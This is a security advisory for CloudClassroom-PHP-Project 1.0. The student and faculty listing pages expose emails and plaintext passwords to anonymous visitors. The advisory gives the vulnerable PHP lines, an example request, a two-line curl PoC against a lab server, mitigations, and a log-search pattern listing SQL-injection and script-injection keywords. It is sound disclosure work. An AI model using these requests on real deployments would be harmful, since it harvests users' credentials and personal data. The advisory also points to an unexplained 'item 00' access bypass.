# Security Advisory — Unauthenticated exposure of PII and plaintext passwords

> **Identifier:** Pending CVE assignment / Internal ID **CC-2026-21**
> **Publication Date:** 02/08/2026
> **Last Updated:** 02/08/2026
> **Severity:** High
> **CVSS:** 7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
> **CWE:** CWE-200: Exposure of Sensitive Information, CWE-522: Insufficiently Protected Credentials, CWE-256: Plaintext Storage of a Password
> **Status:** Unpatched

---

## 1. Executive Summary

A vulnerability was identified in **CloudClassroom-PHP-Project 1.0** (Vishal Mathur — `mathurvishal`), in the component **studentdetails.php, facultydetails.php**, that allows **an attacker (None (via item 00); user interaction: None)** to exploit a **Sensitive Data Exposure / Missing Authorization** flaw.

Admin listings render all rows of studenttable/facutlytable, including the `Pass` column in plaintext. With item 00, any anonymous user obtains, in a single GET request, the complete dump of PII and credentials.

Successful exploitation may result in **Mass leak of PII and plaintext credentials; direct login with obtained passwords.**

Disclosure follows responsible/coordinated policy; formal vendor notification is planned in the disclosure package (see sections 13 and 14). As of now no patch is available.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---:|---:|---|
| CloudClassroom-PHP-Project | 1.0 (and prior) | None | Affected |
| Component: studentdetails.php, facultydetails.php | 1.0 | None | Affected |

- **Repository / Ecosystem:** https://github.com/mathurvishal/CloudClassroom-PHP-Project
- **Evaluated Stack:** PHP + MySQLi, Apache/2.4.41 (Ubuntu), MariaDB 10.3.39

### Unaffected Products

- No other version/product evaluated in this advisory.

---

## 3. Vulnerability Description

The vulnerability occurs due to **Sensitive Data Exposure / Missing Authorization** in the component **studentdetails.php**.

Admin listings render all rows of studenttable/facutlytable, including the `Pass` column in plaintext. With item 00, any anonymous user obtains, in a single GET request, the complete dump of PII and credentials.

**Root cause (source code snippet):**

**`studentdetails.php:90-94`**

```php
<td><?PHP echo $row['Eid'];?></td>   <!-- email -->
<td><?PHP echo $row['Pass'];?></td>  <!-- plaintext password -->
```

### Necessary Conditions

- Authentication: None (via item 00)
- User Interaction: None
- Attack Vector: Remote (network) — method GET
- Preconditions: None on target (item 00).

---

## 4. Impact

Exploitation may allow:

- Mass leak of PII and plaintext credentials
- direct login with obtained passwords

### Impact on Confidentiality

High — an attacker can read sensitive system data (PII, credentials, business data).

### Impact on Integrity

None — the flaw does not directly allow data alteration.

### Impact on Availability

None — no direct availability impact.

---

## 5. Classification

### CVSS

- **Score:** 7.5
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network (N) |
| Attack Complexity (AC) | Low (L) |
| Privileges Required (PR) | None (N) |
| User Interaction (UI) | None (N) |
| Scope (S) | Unchanged (U) |
| Confidentiality (C) | High (H) |
| Integrity (I) | None (N) |
| Availability (A) | None (N) |

### CWE

- CWE-200: Exposure of Sensitive Information
- CWE-522: Insufficiently Protected Credentials
- CWE-256: Plaintext Storage of a Password

### CAPEC

- **CAPEC-116 – Excavation**

---

## 6. Exploitation Scenario

A possible exploitation scenario occurs as follows:

1. Request `studentdetails.php` (and `facultydetails.php`) without cookie.
2. Full listing is rendered (item 00), including emails and password column.
3. Collect credentials and use them in loginlinkstudent.php/loginlinkfaculty.php.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): studentdetails.php, facultydetails.php
Parameter(s): —
Method: GET · Authentication: None (via item 00)
```

### Example Request

```http
GET /studentdetails.php HTTP/1.1
Host: 192.168.95.131:9292
Cookie: PHPSESSID=<session — dispensable via item 00 (Broken Access Control)>
```

### Observed Response

```text
Emails (harsh@ics.com, nihal@ics.com, ...) and passwords '1234' of all records exposed to anonymous.
```

### Result

Reproduced live in authorized lab (http://192.168.95.131:9292/) on 02/08/2026, in a non-destructive manner. Observed behavior confirms the Sensitive Data Exposure / Missing Authorization flaw.

**a) Execution in browser** (real server response rendered, with evidence band):
<img width="1180" height="1294" alt="evidencia-web-21-details-plaintext-disclosure" src="https://github.com/user-attachments/assets/3fe1b575-c68b-4f05-abce-989083de88cf" />

**b) Vulnerable code line** (`studentdetails.php`):
<img width="2360" height="740" alt="evidencia-codigo-21-details-plaintext-disclosure" src="https://github.com/user-attachments/assets/f75c5dc0-33d8-4e57-bb4c-9c6a3154c67c" />


> **Note:** credentials/PII displayed belong to lab test dataset. Remove real secrets before any external publication.

---

## 8. Proof of Concept

The PoC below demonstrates only vulnerable behavior and should be used exclusively in authorized environments. Executable and non-destructive script: **`poc.sh`**.

```bash
curl -s "http://192.168.95.131:9292/studentdetails.php" | grep -A1 -iE "@ics.com|@CC.com"
curl -s "http://192.168.95.131:9292/facultydetails.php"  | grep -iE "Grower|Singh|1234"
```

### Expected Result

```text
Emails (harsh@ics.com, nihal@ics.com, ...) and passwords '1234' of all records exposed to anonymous.
```


### PoC Limitations

- Does not cause intentional unavailability.
- Does not remove or modify third-party data (state injections are restored; error-based aborts before persisting).
- Does not create persistence or backdoor.
- Does not contain real credentials (lab test data only).
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Access an instance of **CloudClassroom-PHP-Project 1.0**.
2. Configure the prerequisite: None on target (item 00).
3. Access the component **studentdetails.php** (parameter(s): —).
4. Send the request/input described in sections 7 and 8.
5. Observe the vulnerable result: Emails (harsh@ics.com, nihal@ics.com, ...) and passwords '1234' of all records exposed to anonymous.
6. Compare with expected safe behavior (properly validated/sanitized/authorized input, without payload reflection or unintended execution).

---

## 10. Mitigation

Until the definitive fix is applied, recommended:

- `exit;` after guard (item 00).
- Never display password column.
- Store passwords with `password_hash()` (bcrypt/argon2).

Additional compensatory measures:

- Restrict access to affected component (network/ACL/WAF).
- Apply WAF/reverse proxy rules to block known attack patterns.
- Review associated permissions and privileges; invalidate potentially exposed sessions/credentials.
- Maintain logs and evidence for investigation.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Fix

**No official fix available as of this advisory date (unpatched product).**

When made available, recommended:

1. Update to patched version or later.
2. Restart affected services, if necessary.
3. Invalidate old sessions and credentials.
4. Review logs prior to update.
5. Confirm vulnerable behavior can no longer be reproduced.

### Recommended Change to Vendor

- `exit;` after guard (item 00).
- Never display password column.
- Store passwords with `password_hash()` (bcrypt/argon2).

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Access to `studentdetails.php` without valid session (HTTP 302 responses accompanied by full body) or by wrong role/privilege.

### Example Log Search

```text
grep -Ei "(union|select|extractvalue|concat|<script|onerror|onload|</textarea)" access.log | grep "studentdetails.php"
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 02/08/2026 | Vulnerability identified (static analysis) |
| 02/08/2026 | Confirmed dynamically in authorized lab |
| 02/08/2026 | Re-validated live with evidence (browser + code) |
| 02/08/2026 | Disclosure package prepared (this advisory) |
| 06/10/2026 | Vendor notification |
| (pending) | CVE requested/reserved |
| (pending) | Fix made available |
| (pending) | Advisory publication |

---

## 14. Vendor Communication

- **Vendor:** Vishal Mathur (`mathurvishal`)
- **Channel used:** Private GitHub Security Advisory of repository / maintainer email.
- **Date of first notification:** (pending)
- **Response status:** Awaiting notification/response
- **Vendor positioning:** N/A at this time

---

## 15. Credits

The vulnerability was identified and reported by:

- **Researcher:** vinniboy021@gmail.com
- **Organization:** Independent security research
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- https://cwe.mitre.org/
- https://www.first.org/cvss/calculator/3.1
- https://cvefeed.io/vuln/product/161371/vishalmathurcloudclassroom-php_project/
- https://github.com/mathurvishal/CloudClassroom-PHP-Project
- https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 02/08/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive and security improvement purposes.

Information presented was obtained in authorized environment and disclosed responsibly or coordinately. The author does not encourage use of this information for unauthorized access, service interruption, privacy violation or any illegal activity.

Use of information in this document is solely the reader's responsibility.

---

## 19. Contact

For corrections, updates or additional information:

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/mathurvishal/CloudClassroom-PHP-Project
